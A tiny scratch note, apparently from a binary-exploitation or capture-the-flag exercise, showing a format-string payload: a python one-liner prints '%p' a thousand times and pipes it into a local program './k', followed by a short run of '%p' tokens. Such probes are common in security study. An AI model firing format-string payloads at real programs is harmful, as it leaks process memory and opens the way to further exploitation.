payload
 python3 -c "print('%p' *1000)" | ./k

 %p %p %p %p

